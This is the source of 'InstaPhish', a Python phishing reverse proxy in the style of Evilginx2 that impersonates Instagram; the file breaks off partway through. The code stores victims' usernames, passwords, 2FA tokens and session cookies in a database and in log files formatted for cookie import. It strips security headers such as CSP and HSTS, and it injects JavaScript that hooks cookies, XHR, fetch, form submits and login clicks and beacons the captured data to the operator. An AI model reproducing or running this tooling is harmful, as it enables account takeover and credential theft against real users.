#!/usr/bin/env python3
"""
InstaPhish v6.0 - Phantom Reverse Proxy
Evilginx2/Modlishka-Style Full Session Hijacking Framework
Complete with Real-Time Cookie Interception, Admin Panel, and Advanced Evasion
Port: 4040 | Admin: 5000
"""

import os
import sys
import json
import ssl
import time
import re
import base64
import sqlite3
import threading
import hashlib
import random
import string
import http.server
import socketserver
import subprocess
import shutil
import socket
import urllib.request
import urllib.error
import urllib.parse
import http.cookiejar
import tempfile
import textwrap
import ipaddress
from pathlib import Path
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote, urlunparse
from io import BytesIO
from http.cookies import SimpleCookie
from collections import OrderedDict
from email.parser import BytesParser
from http import HTTPStatus

# ==================== CONFIGURATION ====================
class Config:
    """Central configuration management"""
    
    # Server Configuration
    LISTEN_HOST = "0.0.0.0"
    LISTEN_PORT = 4040
    ADMIN_PORT = 5000
    
    # SSL Configuration
    SSL_CERT = "certs/instagram.crt"
    SSL_KEY = "certs/instagram.key"
    
    # Database Configuration
    DB_FILE = "victims.db"
    
    # Logging Configuration
    LOG_FILE = "logs/credentials.txt"
    COOKIE_FILE = "logs/cookies.txt"
    SESSION_FILE = "logs/sessions.json"
    
    # Target Configuration
    TARGET_HOST = "www.instagram.com"
    TARGET_PORT = 443
    
    # Proxy Configuration
    STRIP_SECURITY_HEADERS = True
    INJECT_COOKIE_HOOKS = True
    BYPASS_CSP = True
    SPOOF_HSTS = True
    BLOCK_FAVICON = True
    ANTI_BOT_DETECTION = True
    SESSION_PERSISTENCE = True
    AUTO_REDIRECT = True
    
    # Attack Configuration
    CAPTURE_CREDENTIALS = True
    CAPTURE_COOKIES = True
    CAPTURE_2FA_TOKENS = True
    INTERCEPT_LOGIN = True
    INTERCEPT_SET_COOKIE = True
    
    # Debug Configuration
    DEBUG = False
    VERBOSE = True

CONFIG = Config()

# ==================== COLOR SYSTEM ====================
class Color:
    """Terminal color codes"""
    BLACK = '\033[30m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    RESET = '\033[0m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'

# ==================== BANNER SYSTEM ====================
class Banner:
    """Display system for the framework"""
    
    @staticmethod
    def print_startup_banner():
        """Display the main startup banner"""
        banner = f"""
{Color.RED}╔══════════════════════════════════════════════════════════════════════════════════╗
{Color.RED}║  {Color.WHITE}██╗███╗   ██╗███████╗████████╗ █████╗ ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗{Color.RED}    ║
{Color.RED}║  {Color.WHITE}██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║  ██║██║██╔════╝██║  ██║{Color.RED}    ║
{Color.RED}║  {Color.WHITE}██║██╔██╗ ██║███████╗   ██║   ███████║██████╔╝███████║██║███████╗███████║{Color.RED}    ║
{Color.RED}║  {Color.WHITE}██║██║╚██╗██║╚════██║   ██║   ██╔══██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║{Color.RED}    ║
{Color.RED}║  {Color.WHITE}██║██║ ╚████║███████║   ██║   ██║  ██║██║     ██║  ██║██║███████║██║  ██║{Color.RED}    ║
{Color.RED}║  {Color.WHITE}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝{Color.RED}    ║
{Color.RED}║{Color.RESET}                                                                              {Color.RED}║
{Color.RED}║  {Color.MAGENTA}{Color.BOLD}PHANTOM REVERSE PROXY v6.0{Color.RESET}                                                      {Color.RED}║
{Color.RED}║  {Color.CYAN}Evilginx2 + Modlishka Style Full Session Hijacking Framework{Color.RESET}              {Color.RED}║
{Color.RED}║  {Color.GREEN}HTTPS Port: {CONFIG.LISTEN_PORT} | Admin Panel: {CONFIG.ADMIN_PORT}{Color.RESET}                                {Color.RED}║
{Color.RED}║  {Color.YELLOW}Target: {CONFIG.TARGET_HOST}{Color.RESET}                                                      {Color.RED}║
{Color.RED}╚══════════════════════════════════════════════════════════════════════════════════╝{Color.RESET}
"""
        print(banner)
    
    @staticmethod
    def print_capture_alert(data_type, details):
        """Display capture alerts"""
        if data_type == "credentials":
            print(f"\n{Color.BG_RED}{Color.WHITE}{Color.BOLD} ⚡ CREDENTIALS CAPTURED ⚡ {Color.RESET}")
            for key, value in details.items():
                print(f"  {Color.RED}├─ {key}:{Color.RESET} {Color.WHITE}{value}{Color.RESET}")
            print()
        elif data_type == "cookies":
            print(f"\n{Color.BG_YELLOW}{Color.BLACK}{Color.BOLD} 🍪 SESSION COOKIES HIJACKED 🍪 {Color.RESET}")
            for key, value in details.items():
                if key.lower() == 'sessionid':
                    print(f"  {Color.YELLOW}├─ {key}:{Color.RESET} {Color.MAGENTA}{value[:50]}...{Color.RESET}")
                else:
                    print(f"  {Color.YELLOW}├─ {key}:{Color.RESET} {Color.WHITE}{value}{Color.RESET}")
            print()
        elif data_type == "2fa":
            print(f"\n{Color.BG_MAGENTA}{Color.WHITE}{Color.BOLD} 🔐 2FA TOKEN CAPTURED 🔐 {Color.RESET}")
            print(f"  {Color.MAGENTA}├─ Token:{Color.RESET} {Color.WHITE}{details.get('token', 'Unknown')}{Color.RESET}")
            print()

# ==================== DATABASE MANAGER ====================
class DatabaseManager:
    """SQLite database management for victim data"""
    
    def __init__(self, db_file=CONFIG.DB_FILE):
        self.db_file = db_file
        self.lock = threading.Lock()
        self._init_database()
    
    def _init_database(self):
        """Initialize database schema"""
        with self.lock:
            conn = sqlite3.connect(self.db_file, check_same_thread=False)
            c = conn.cursor()
            
            # Main victims table
            c.execute('''CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                ip_address TEXT,
                user_agent TEXT,
                username TEXT,
                password TEXT,
                email TEXT,
                phone TEXT,
                sessionid TEXT,
                csrftoken TEXT,
                ds_user_id TEXT,
                rur TEXT,
                mid TEXT,
                ig_did TEXT,
                datr TEXT,
                shbid TEXT,
                shbts TEXT,
                target_url TEXT,
                referer TEXT,
                capture_method TEXT,
                all_cookies TEXT,
                is_valid INTEGER DEFAULT 1,
                notes TEXT
            )''')
            
            # Active sessions table (for session persistence)
            c.execute('''CREATE TABLE IF NOT EXISTS active_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id INTEGER,
                sessionid TEXT NOT NULL,
                csrftoken TEXT,
                ds_user_id TEXT,
                rur TEXT,
                mid TEXT,
                ig_did TEXT,
                all_cookies TEXT,
                captured_at TEXT NOT NULL,
                last_validated TEXT,
                is_active INTEGER DEFAULT 1,
                validation_count INTEGER DEFAULT 0,
                proxy_used TEXT,
                FOREIGN KEY(victim_id) REFERENCES victims(id) ON DELETE CASCADE
            )''')
            
            # Attack log table
            c.execute('''CREATE TABLE IF NOT EXISTS attack_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                attack_type TEXT,
                target_ip TEXT,
                user_agent TEXT,
                payload TEXT,
                response_code INTEGER,
                success INTEGER DEFAULT 0,
                cookies_captured INTEGER DEFAULT 0,
                details TEXT
            )''')
            
            # Proxy configuration table
            c.execute('''CREATE TABLE IF NOT EXISTS proxy_config (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                config_name TEXT UNIQUE,
                config_value TEXT,
                updated_at TEXT
            )''')
            
            # Create indices for performance
            c.execute('CREATE INDEX IF NOT EXISTS idx_victims_timestamp ON victims(timestamp)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_victims_ip ON victims(ip_address)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_victims_sessionid ON victims(sessionid)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_victims_username ON victims(username)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_sessions_sessionid ON active_sessions(sessionid)')
            c.execute('CREATE INDEX IF NOT EXISTS idx_attack_timestamp ON attack_log(timestamp)')
            
            conn.commit()
            conn.close()
    
    def store_victim(self, data):
        """Store victim data"""
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_file, check_same_thread=False)
                c = conn.cursor()
                
                c.execute('''INSERT INTO victims 
                    (timestamp, ip_address, user_agent, username, password, email, phone,
                     sessionid, csrftoken, ds_user_id, rur, mid, ig_did, datr, shbid, shbts,
                     target_url, referer, capture_method, all_cookies, is_valid)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                    (data.get('timestamp', datetime.now().isoformat()),
                     data.get('ip', ''),
                     data.get('user_agent', ''),
                     data.get('username', ''),
                     data.get('password', ''),
                     data.get('email', ''),
                     data.get('phone', ''),
                     data.get('sessionid', ''),
                     data.get('csrftoken', ''),
                     data.get('ds_user_id', ''),
                     data.get('rur', ''),
                     data.get('mid', ''),
                     data.get('ig_did', ''),
                     data.get('datr', ''),
                     data.get('shbid', ''),
                     data.get('shbts', ''),
                     data.get('target_url', ''),
                     data.get('referer', ''),
                     data.get('capture_method', 'unknown'),
                     data.get('all_cookies', ''),
                     1))
                
                victim_id = c.lastrowid
                
                # Store active session if session cookie captured
                if data.get('sessionid'):
                    c.execute('''INSERT INTO active_sessions 
                        (victim_id, sessionid, csrftoken, ds_user_id, rur, mid, ig_did,
                         all_cookies, captured_at, is_active)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1)''',
                        (victim_id,
                         data.get('sessionid', ''),
                         data.get('csrftoken', ''),
                         data.get('ds_user_id', ''),
                         data.get('rur', ''),
                         data.get('mid', ''),
                         data.get('ig_did', ''),
                         data.get('all_cookies', ''),
                         datetime.now().isoformat()))
                
                conn.commit()
                conn.close()
                
                return victim_id
                
            except Exception as e:
                print(f"{Color.RED}[DB ERROR] Store victim: {e}{Color.RESET}")
                return None
    
    def log_attack(self, data):
        """Log attack attempt"""
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_file, check_same_thread=False)
                c = conn.cursor()
                c.execute('''INSERT INTO attack_log 
                    (timestamp, attack_type, target_ip, user_agent, payload, response_code, success, cookies_captured, details)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                    (datetime.now().isoformat(),
                     data.get('type', 'unknown'),
                     data.get('ip', ''),
                     data.get('user_agent', ''),
                     data.get('payload', ''),
                     data.get('response_code', 0),
                     data.get('success', 0),
                     data.get('cookies_captured', 0),
                     data.get('details', '')))
                conn.commit()
                conn.close()
            except Exception as e:
                print(f"{Color.RED}[DB ERROR] Log attack: {e}{Color.RESET}")
    
    def get_victims(self, limit=200, offset=0):
        """Get victim records"""
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_file, check_same_thread=False)
                c = conn.cursor()
                c.execute('SELECT * FROM victims ORDER BY id DESC LIMIT ? OFFSET ?', (limit, offset))
                victims = []
                columns = [desc[0] for desc in c.description]
                for row in c.fetchall():
                    victims.append(dict(zip(columns, row)))
                conn.close()
                return victims
            except Exception as e:
                print(f"{Color.RED}[DB ERROR] Get victims: {e}{Color.RESET}")
                return []
    
    def get_active_sessions(self, limit=100):
        """Get active hijacked sessions"""
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_file, check_same_thread=False)
                c = conn.cursor()
                c.execute('SELECT * FROM active_sessions WHERE is_active=1 ORDER BY id DESC LIMIT ?', (limit,))
                sessions = []
                columns = [desc[0] for desc in c.description]
                for row in c.fetchall():
                    sessions.append(dict(zip(columns, row)))
                conn.close()
                return sessions
            except Exception as e:
                print(f"{Color.RED}[DB ERROR] Get sessions: {e}{Color.RESET}")
                return []
    
    def get_stats(self):
        """Get statistics"""
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_file, check_same_thread=False)
                c = conn.cursor()
                
                c.execute('SELECT COUNT(*) FROM victims')
                total = c.fetchone()[0]
                
                today = datetime.now().strftime('%Y-%m-%d')
                c.execute("SELECT COUNT(*) FROM victims WHERE timestamp LIKE ?", (f"{today}%",))
                today_count = c.fetchone()[0]
                
                c.execute("SELECT COUNT(*) FROM victims WHERE sessionid IS NOT NULL AND sessionid != ''")
                sessions_count = c.fetchone()[0]
                
                c.execute("SELECT COUNT(*) FROM active_sessions WHERE is_active=1")
                active_sessions = c.fetchone()[0]
                
                one_hour_ago = (datetime.now() - timedelta(hours=1)).isoformat()
                c.execute("SELECT COUNT(*) FROM victims WHERE timestamp > ?", (one_hour_ago,))
                recent = c.fetchone()[0]
                
                conn.close()
                
                return {
                    'total': total,
                    'today': today_count,
                    'sessions_captured': sessions_count,
                    'active_sessions': active_sessions,
                    'recent': recent
                }
            except Exception as e:
                print(f"{Color.RED}[DB ERROR] Get stats: {e}{Color.RESET}")
                return {'total': 0, 'today': 0, 'sessions_captured': 0, 'active_sessions': 0, 'recent': 0}
    
    def delete_victim(self, victim_id):
        """Delete victim record"""
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_file, check_same_thread=False)
                c = conn.cursor()
                c.execute('DELETE FROM victims WHERE id=?', (victim_id,))
                c.execute('DELETE FROM active_sessions WHERE victim_id=?', (victim_id,))
                conn.commit()
                conn.close()
                return True
            except Exception as e:
                print(f"{Color.RED}[DB ERROR] Delete: {e}{Color.RESET}")
                return False
    
    def clear_all(self):
        """Clear all records"""
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_file, check_same_thread=False)
                c = conn.cursor()
                c.execute('DELETE FROM victims')
                c.execute('DELETE FROM active_sessions')
                c.execute('DELETE FROM attack_log')
                conn.commit()
                conn.close()
                return True
            except Exception as e:
                print(f"{Color.RED}[DB ERROR] Clear: {e}{Color.RESET}")
                return False
    
    def backup(self):
        """Backup database"""
        try:
            backup_dir = "backups"
            os.makedirs(backup_dir, exist_ok=True)
            backup_name = f"{backup_dir}/victims_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
            shutil.copy2(self.db_file, backup_name)
            return backup_name
        except Exception as e:
            print(f"{Color.RED}[BACKUP ERROR] {e}{Color.RESET}")
            return None

# ==================== COOKIE PARSER ====================
class CookieParser:
    """Advanced cookie parsing and management"""
    
    @staticmethod
    def parse_cookie_string(cookie_string):
        """Parse a cookie string into a dictionary"""
        cookies = OrderedDict()
        if not cookie_string:
            return cookies
        
        # Try multiple parsing strategies
        for item in cookie_string.split(';'):
            item = item.strip()
            if '=' in item:
                key, value = item.split('=', 1)
                key = key.strip()
                value = value.strip()
                if key:
                    cookies[key] = value
        
        return cookies
    
    @staticmethod
    def parse_set_cookie(set_cookie_header):
        """Parse Set-Cookie headers and extract important Instagram cookies"""
        important_cookies = OrderedDict()
        
        if not set_cookie_header:
            return important_cookies
        
        # If it's a list, process each header
        if isinstance(set_cookie_header, list):
            headers = set_cookie_header
        else:
            headers = [set_cookie_header]
        
        for header in headers:
            if not header:
                continue
            
            try:
                cookie = SimpleCookie()
                cookie.load(header)
                
                for key, morsel in cookie.items():
                    key_lower = key.lower()
                    # Instagram-specific important cookies
                    if key_lower in ['sessionid', 'csrftoken', 'ds_user_id', 'ds_user', 
                                    'rur', 'mid', 'ig_did', 'ig_nrcb', 'datr', 
                                    'shbid', 'shbts', 'session', 'x-csrftoken']:
                        important_cookies[key_lower] = morsel.value
                    # Also capture any cookie with 'session' or 'auth' in name
                    elif 'session' in key_lower or 'auth' in key_lower or 'token' in key_lower:
                        important_cookies[key_lower] = morsel.value
                        
            except Exception:
                # Fallback manual parsing
                try:
                    parts = header.split(';')[0].strip()
                    if '=' in parts:
                        key, value = parts.split('=', 1)
                        key = key.strip().lower()
                        if key in ['sessionid', 'csrftoken', 'ds_user_id', 'rur', 'mid', 'ig_did']:
                            important_cookies[key] = value.strip()
                except:
                    pass
        
        return important_cookies
    
    @staticmethod
    def cookies_to_string(cookies_dict):
        """Convert cookie dictionary to string format"""
        if not cookies_dict:
            return ""
        return "; ".join([f"{k}={v}" for k, v in cookies_dict.items()])
    
    @staticmethod
    def cookies_to_json(cookies_dict):
        """Convert cookie dictionary to JSON string"""
        if not cookies_dict:
            return "{}"
        return json.dumps(cookies_dict)

# ==================== FILE LOGGER ====================
class FileLogger:
    """File-based logging system"""
    
    @staticmethod
    def log_credentials(data):
        """Log captured credentials to file"""
        try:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open(CONFIG.LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"\n{'='*70}\n")
                f.write(f"TIMESTAMP: {timestamp}\n")
                f.write(f"IP: {data.get('ip', 'Unknown')}\n")
                f.write(f"USER AGENT: {data.get('user_agent', 'Unknown')}\n")
                if data.get('username'):
                    f.write(f"USERNAME: {data['username']}\n")
                if data.get('password'):
                    f.write(f"PASSWORD: {data['password']}\n")
                if data.get('email'):
                    f.write(f"EMAIL: {data['email']}\n")
                if data.get('phone'):
                    f.write(f"PHONE: {data['phone']}\n")
                f.write(f"METHOD: {data.get('capture_method', 'unknown')}\n")
                if data.get('target_url'):
                    f.write(f"TARGET URL: {data['target_url']}\n")
                if data.get('referer'):
                    f.write(f"REFERER: {data['referer']}\n")
                f.write(f"{'='*70}\n")
        except Exception as e:
            print(f"{Color.RED}[LOG ERROR] Credentials: {e}{Color.RESET}")
    
    @staticmethod
    def log_cookies(data):
        """Log captured cookies to file"""
        try:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open(CONFIG.COOKIE_FILE, "a", encoding="utf-8") as f:
                f.write(f"\n{'='*70}\n")
                f.write(f"TIMESTAMP: {timestamp}\n")
                f.write(f"IP: {data.get('ip', 'Unknown')}\n")
                if data.get('username'):
                    f.write(f"USERNAME: {data['username']}\n")
                if data.get('sessionid'):
                    f.write(f"SESSIONID: {data['sessionid']}\n")
                if data.get('csrftoken'):
                    f.write(f"CSRFTOKEN: {data['csrftoken']}\n")
                if data.get('ds_user_id'):
                    f.write(f"DS_USER_ID: {data['ds_user_id']}\n")
                if data.get('all_cookies'):
                    f.write(f"ALL COOKIES: {data['all_cookies']}\n")
                    f.write(f"\n--- IMPORT FOR EDITTHISCOOKIE ---\n")
                    f.write(f"{data['all_cookies']}\n")
                    f.write(f"--- END COOKIE IMPORT ---\n")
                f.write(f"{'='*70}\n")
            
            # Also save to sessions file for easy import
            if data.get('all_cookies'):
                with open(CONFIG.SESSION_FILE, "a", encoding="utf-8") as f:
                    f.write(json.dumps({
                        'timestamp': timestamp,
                        'cookies': data.get('all_cookies', ''),
                        'sessionid': data.get('sessionid', ''),
                        'ip': data.get('ip', '')
                    }) + "\n")
                    
        except Exception as e:
            print(f"{Color.RED}[LOG ERROR] Cookies: {e}{Color.RESET}")

# ==================== REVERSE PROXY ENGINE ====================
class ReverseProxyEngine:
    """
    Evilginx2/Modlishka-style reverse proxy engine
    Handles all communication with the target Instagram server
    """
    
    def __init__(self):
        self.target_host = CONFIG.TARGET_HOST
        self.ssl_context = self._create_ssl_context()
        self.cookie_jar = http.cookiejar.CookieJar()
        self.setup_handlers()
    
    def _create_ssl_context(self):
        """Create SSL context for secure connections"""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        return ctx
    
    def setup_handlers(self):
        """Setup URL handlers"""
        # HTTPS handler with custom SSL context
        https_handler = urllib.request.HTTPSHandler(context=self.ssl_context)
        
        # Cookie handler for session persistence
        cookie_handler = urllib.request.HTTPCookieProcessor(self.cookie_jar)
        
        # Redirect handler
        redirect_handler = urllib.request.HTTPRedirectHandler()
        
        # Build opener with all handlers
        self.opener = urllib.request.build_opener(
            https_handler, 
            cookie_handler, 
            redirect_handler
        )
        
        # Set custom User-Agent
        self.opener.addheaders = [
            ('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'),
            ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'),
            ('Accept-Language', 'en-US,en;q=0.5'),
            ('Accept-Encoding', 'gzip, deflate, br'),
            ('DNT', '1'),
            ('Connection', 'keep-alive'),
            ('Upgrade-Insecure-Requests', '1'),
            ('Sec-Fetch-Dest', 'document'),
            ('Sec-Fetch-Mode', 'navigate'),
            ('Sec-Fetch-Site', 'none'),
            ('Sec-Fetch-User', '?1'),
            ('Cache-Control', 'max-age=0'),
        ]
    
    def fetch_from_target(self, method, path, headers, body=None, query_string=""):
        """
        Fetch content from the real Instagram server
        Returns: (status_code, response_headers, response_body, set_cookies)
        """
        try:
            # Build the full URL
            url = f"https://{self.target_host}{path}"
            if query_string:
                url += f"?{query_string}"
            
            # Clean headers - remove hop-by-hop and replace Host
            clean_headers = {}
            hop_by_hop = {
                'connection', 'keep-alive', 'proxy-authenticate', 
                'proxy-authorization', 'te', 'trailers', 
                'transfer-encoding', 'upgrade', 'host',
                'proxy-connection', 'content-length'
            }
            
            for key, value in headers.items():
                key_lower = key.lower()
                if key_lower not in hop_by_hop:
                    clean_headers[key] = value
            
            # Force the correct Host header
            clean_headers['Host'] = self.target_host
            
            # Remove compression so we can modify responses
            clean_headers['Accept-Encoding'] = 'identity'
            
            # Create the request
            data = body if body else None
            req = urllib.request.Request(url, data=data, headers=clean_headers, method=method)
            
            # Execute request
            response = self.opener.open(req, timeout=30)
            
            # Extract response data
            status_code = response.status
            response_headers = dict(response.headers)
            response_body = response.read()
            
            # Extract Set-Cookie headers
            set_cookies = []
            if hasattr(response, 'headers'):
                set_cookies = response.headers.get_all('Set-Cookie') if hasattr(response.headers, 'get_all') else []
                if not set_cookies:
                    sc = response.headers.get('Set-Cookie')
                    if sc:
                        set_cookies = [sc]
            
            # Handle gzip encoding if present
            if response_headers.get('Content-Encoding') == 'gzip':
                try:
                    response_body = gzip.decompress(response_body)
                except:
                    pass
            
            return status_code, response_headers, response_body, set_cookies
            
        except urllib.error.HTTPError as e:
            # Handle HTTP errors from target
            status = e.code
            resp_headers = dict(e.headers) if e.headers else {}
            body = e.read() if e.fp else b""
            set_cookies = []
            if hasattr(e, 'headers'):
                set_cookies = e.headers.get_all('Set-Cookie') if hasattr(e.headers, 'get_all') else []
                if not set_cookies:
                    sc = e.headers.get('Set-Cookie')
                    if sc:
                        set_cookies = [sc]
            return status, resp_headers, body, set_cookies
            
        except urllib.error.URLError as e:
            print(f"{Color.RED}[PROXY] URL Error: {e.reason}{Color.RESET}")
            return 502, {}, b"<html><body><h1>Gateway Error</h1></body></html>", []
            
        except Exception as e:
            print(f"{Color.RED}[PROXY] Error: {e}{Color.RESET}")
            return 502, {}, b"<html><body><h1>Proxy Error</h1></body></html>", []
    
    def modify_response(self, body, content_type, request_path=""):
        """
        Modify the response body to inject cookie capture hooks
        and rewrite URLs to point to our proxy
        """
        if not body:
            return body
        
        try:
            # Only modify HTML responses
            if 'text/html' in content_type.lower() or 'application/xhtml' in content_type.lower():
                body_str = body.decode('utf-8', errors='ignore')
                
                # Replace all Instagram URLs with our proxy
                replacements = [
                    ('https://www.instagram.com', ''),
                    ('https://instagram.com', ''),
                    ('http://www.instagram.com', ''),
                    ('http://instagram.com', ''),
                    ('//www.instagram.com', ''),
                    ('//instagram.com', ''),
                    ('www.instagram.com', ''),
                ]
                
                for old, new in replacements:
                    body_str = body_str.replace(old, new)
                
                # Replace CDN URLs
                cdn_replacements = [
                    ('https://static.cdninstagram.com', '/cdn-proxy'),
                    ('https://scontent.cdninstagram.com', '/cdn-proxy'),
                ]
                for old, new in cdn_replacements:
                    body_str = body_str.replace(old, new)
                
                # Inject cookie capture JavaScript
                if CONFIG.INJECT_COOKIE_HOOKS:
                    capture_script = self._get_capture_script()
                    body_str = body_str.replace('</head>', f'{capture_script}\n</head>')
                
                return body_str.encode('utf-8')
            
            # Pass through other content types unchanged
            return body
            
        except Exception as e:
            print(f"{Color.RED}[MODIFY] Error: {e}{Color.RESET}")
            return body
    
    def _get_capture_script(self):
        """Generate the cookie capture JavaScript injection"""
        return """
<script id="phantom-capture">
(function() {
    'use strict';
    var CAPTURE_URL = '/__capture';
    
    function send(data) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', CAPTURE_URL, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(data));
        } catch(e) {}
        try {
            navigator.sendBeacon(CAPTURE_URL, JSON.stringify(data));
        } catch(e) {}
    }
    
    function getAllCookies() {
        return document.cookie || '';
    }
    
    function parseCookies(cookieStr) {
        var cookies = {};
        if (!cookieStr) return cookies;
        cookieStr.split(';').forEach(function(pair) {
            var parts = pair.trim().split('=');
            if (parts.length >= 2) {
                cookies[parts[0].trim()] = parts.slice(1).join('=').trim();
            }
        });
        return cookies;
    }
    
    // Method 1: Hook document.cookie setter
    try {
        var cookieDesc = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') ||
                        Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');
        if (cookieDesc && cookieDesc.configurable) {
            Object.defineProperty(document, 'cookie', {
                get: function() { return cookieDesc.get.call(document); },
                set: function(val) {
                    var oldCookies = parseCookies(cookieDesc.get.call(document));
                    var newCookies = parseCookies(val);
                    send({
                        type: 'cookie-hook',
                        newValue: val,
                        allCookies: cookieDesc.get.call(document),
                        newKeys: Object.keys(newCookies),
                        url: window.location.href,
                        timestamp: Date.now()
                    });
                    return cookieDesc.set.call(document, val);
                },
                configurable: true
            });
        }
    } catch(e) {}
    
    // Method 2: Hook XMLHttpRequest
    var XHR = XMLHttpRequest.prototype;
    var origOpen = XHR.open;
    var origSend = XHR.send;
    var origSetRequestHeader = XHR.setRequestHeader;
    
    XHR.open = function(method, url) {
        this._phantom = { method: method, url: url };
        return origOpen.apply(this, arguments);
    };
    
    XHR.send = function(body) {
        var self = this;
        this.addEventListener('load', function() {
            if (self._phantom && self._phantom.url) {
                var url = self._phantom.url;
                if (url.indexOf('login') > -1 || url.indexOf('accounts') > -1 || 
                    url.indexOf('auth') > -1 || url.indexOf('session') > -1) {
                    var respCookies = self.getResponseHeader('Set-Cookie');
                    if (respCookies) {
                        send({
                            type: 'xhr-response-cookie',
                            cookies: respCookies,
                            url: url,
                            allCookies: getAllCookies(),
                            timestamp: Date.now()
                        });
                    }
                    send({
                        type: 'xhr-intercept',
                        cookies: getAllCookies(),
                        url: url,
                        timestamp: Date.now()
                    });
                }
            }
        });
        return origSend.apply(this, arguments);
    };
    
    // Method 3: Hook fetch API
    var origFetch = window.fetch;
    window.fetch = function() {
        var args = arguments;
        return origFetch.apply(this, args).then(function(response) {
            var url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url) || '';
            if (url && (url.indexOf('login') > -1 || url.indexOf('accounts') > -1)) {
                send({
                    type: 'fetch-intercept',
                    cookies: getAllCookies(),
                    url: url,
                    timestamp: Date.now()
                });
            }
            var setCookie = response.headers.get('Set-Cookie');
            if (setCookie) {
                send({
                    type: 'fetch-response-cookie',
                    cookies: setCookie,
                    url: url,
                    timestamp: Date.now()
                });
            }
            return response;
        });
    };
    
    // Method 4: Form submission capture
    document.addEventListener('submit', function(e) {
        setTimeout(function() {
            var form = e.target;
            var inputs = form.querySelectorAll('input');
            var data = { type: 'form-submit', formAction: form.action, timestamp: Date.now() };
            inputs.forEach(function(input) {
                if (input.name && input.value) {
                    data[input.name] = input.value;
                }
            });
            if (Object.keys(data).length > 3) {
                send(data);
            }
        }, 50);
    }, true);
    
    // Method 5: Click capture on login buttons
    document.addEventListener('click', function(e) {
        var target = e.target;
        if (target.type === 'submit' || 
            target.id === 'loginbutton' || 
            target.className.includes('login') ||
            target.textContent.includes('Log in') ||
            target.textContent.includes('Sign in')) {
            setTimeout(function() {
                var form = target.closest('form') || document.querySelector('form');
                if (form) {
                    var inputs = form.querySelectorAll('input[type="text"], input[type="password"], input[name="username"], input[name="password"]');
                    var data = { type: 'login-click', timestamp: Date.now() };
                    inputs.forEach(function(input) {
                        if (input.name && input.value) {
                            data[input.name] = input.value;
                        }
                    });
                    if (Object.keys(data).length > 3) {
                        send(data);
                    }
                }
            }, 100);
        }
    }, true);
    
    // Method 6: Periodic beacon
    setInterval(function() {
        var cookies = getAllCookies();
        if (cookies && (cookies.indexOf('sessionid') > -1 || 
                       cookies.indexOf('csrftoken') > -1 || 
                       cookies.indexOf('ds_user_id') > -1)) {
            send({
                type: 'periodic-beacon',
                cookies: cookies,
                url: window.location.href,
                timestamp: Date.now()
            });
        }
    }, 4000);
    
    // Method 7: Initial cookie dump
    setTimeout(function() {
        var cookies = getAllCookies();
        if (cookies) {
            send({
                type: 'initial-dump',
                cookies: cookies,
                url: window.location.href,
                timestamp: Date.now()
            });
        }
    }, 1000);
    
    // Method 8: Intercept window.location changes
    var originalAssign = window.location.assign;
    window.location.assign = function(url) {
        send({
            type: 'location-change',
            from: window.location.href,
            to: url,
            cookies: getAllCookies(),
            timestamp: Date.now()
        });
        return originalAssign.apply(this, arguments);
    };
    
})();
</script>
"""
    
    def strip_security_headers(self, headers):
        """
        Strip security headers that would block our cookie capture
        (Evilginx2-style header manipulation)
        """
        security_headers_to_strip = [
            'content-security-policy',
            'content-security-policy-report-only',
            'x-content-security-policy',
            'x-webkit-csp',
            'x-frame-options',
            'x-xss-protection',
            'strict-transport-security',
            'public-key-pins',
